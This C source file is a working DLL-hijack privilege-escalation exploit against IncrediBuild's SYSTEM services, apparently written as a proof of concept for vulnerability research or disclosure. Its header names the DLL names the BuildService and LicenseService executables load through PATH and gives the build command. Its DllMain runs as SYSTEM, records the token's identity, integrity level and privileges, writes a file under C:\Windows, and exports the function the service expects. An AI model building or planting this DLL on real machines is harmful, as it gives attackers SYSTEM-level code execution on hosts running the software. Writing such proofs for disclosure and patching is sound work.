/*
 * dll_hijack.c — DLL hijack payload for IncrediBuild SYSTEM services
 *
 * When loaded by BuildService.exe or LicenseService.exe (SYSTEM),
 * DllMain writes proof of SYSTEM execution to C:\ProgramData\dll_lpe_proof.txt
 *
 * Target DLLs (not in app dir or System32, found via PATH search in vmware\bin):
 *   BuildService.exe:  incredibuildmenu.dll, vcltest3.dll
 *   LicenseService.exe: licensespringvmd.dll
 *
 * Build:
 *   cl /nologo dll_hijack.c /Fe:incredibuildmenu.dll /LD /link advapi32.lib
 */
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "advapi32.lib")

static void WriteProof(const char *dllName) {
    char path[MAX_PATH];
    const char *paths[] = {
        "C:\\ProgramData\\dll_lpe_proof.txt",
        "C:\\Windows\\Temp\\dll_lpe_proof.txt",
        "C:\\Temp\\dll_lpe_proof.txt"
    };
    FILE *f = NULL;
    for (int i = 0; i < 3 && !f; i++) {
        f = fopen(paths[i], "a");
    }
    if (!f) return;

    fprintf(f, "\n=== DLL HIJACK LPE — %s ===\n", dllName);

    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        BYTE buf[512]; DWORD sz = sizeof(buf);

        /* User name */
        char user[256] = "?", domain[256] = "?"; DWORD ul=256, dl=256;
        SID_NAME_USE snu;
        if (GetTokenInformation(hToken, TokenUser, buf, sz, &sz)) {
            LookupAccountSidA(NULL, ((TOKEN_USER*)buf)->User.Sid, user, &ul, domain, &dl, &snu);
        }

        /* Integrity level */
        sz = sizeof(buf);
        const char *ils = "Unknown";
        if (GetTokenInformation(hToken, TokenIntegrityLevel, buf, sz, &sz)) {
            DWORD il = *GetSidSubAuthority(((TOKEN_MANDATORY_LABEL*)buf)->Label.Sid,
                        *GetSidSubAuthorityCount(((TOKEN_MANDATORY_LABEL*)buf)->Label.Sid) - 1);
            if      (il >= 0x4000) ils = "SYSTEM";
            else if (il >= 0x3000) ils = "High";
            else if (il >= 0x2000) ils = "Medium";
            else                   ils = "Low";
        }

        fprintf(f, "Identity: %s\\%s\nIntegrity: %s\n\n", domain, user, ils);

        /* Privileges */
        sz = sizeof(buf); BYTE priv_buf[2048]; DWORD priv_sz = sizeof(priv_buf);
        if (GetTokenInformation(hToken, TokenPrivileges, priv_buf, priv_sz, &priv_sz)) {
            TOKEN_PRIVILEGES *tp = (TOKEN_PRIVILEGES*)priv_buf;
            fprintf(f, "Privileges (%u):\n", (unsigned)tp->PrivilegeCount);
            for (DWORD i = 0; i < tp->PrivilegeCount; i++) {
                char pname[128]; DWORD plen = sizeof(pname);
                LookupPrivilegeNameA(NULL, &tp->Privileges[i].Luid, pname, &plen);
                if (tp->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED)
                    fprintf(f, "  [ENABLED] %s\n", pname);
            }
        }
        CloseHandle(hToken);
    }

    /* Also try to write a file to a SYSTEM-only writable location */
    FILE *f2 = fopen("C:\\Windows\\dll_lpe_created.txt", "w");
    if (f2) { fprintf(f2, "Written by SYSTEM DLL hijack\n"); fclose(f2);
              fprintf(f, "\nAlso wrote: C:\\Windows\\dll_lpe_created.txt\n"); }

    fclose(f);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        char name[MAX_PATH];
        GetModuleFileNameA(hinstDLL, name, sizeof(name));
        WriteProof(name);
    }
    return TRUE;
}

/* BuildService calls GetProcAddress(hMod, "RegisterAutomation") after loading.
 * Export it so the call chain completes (our work is done in DllMain already). */
__declspec(dllexport) int __cdecl RegisterAutomation(DWORD cbData, PVOID lpData) {
    (void)cbData; (void)lpData;
    return 1;
}
